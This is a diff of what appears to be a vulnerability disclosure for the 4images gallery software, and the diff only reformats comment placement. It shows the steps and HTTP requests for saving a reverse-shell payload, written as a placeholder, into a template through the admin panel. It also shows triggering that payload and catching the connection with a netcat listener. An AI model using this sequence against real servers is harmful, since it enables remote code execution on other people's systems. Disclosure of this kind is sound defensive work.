@@ -11,9 +11,8 @@ To reproduce do the following:
 5. Click "Save Changes"
 6. Browse to ```"http://host/4images/categories.php?cat_id=1"```
 
-
-// HTTP POST request showing reverse shell payload
 ```
+// HTTP POST request showing reverse shell payload
 POST /4images/admin/templates.php HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
@@ -22,17 +21,18 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 F
 __csrf=c39b7dea0ff15442681362d2a583c7a9&action=savetemplate&content=[REVERSE_SHELL_CODE]&template_file_name=categories.html&template_folder=default_960px[...]
 ```
 
-
-// HTTP redirect response to specific template
 ```
+// HTTP redirect response to specific template
+
 GET /4images/categories.php?cat_id=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
 [...]
 ```
 
-// HTTP request showing reverse shell connection
 ```
+// HTTP request showing reverse shell connection
+
 # nc -kvlp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from localhost [127.0.0.1] 43032
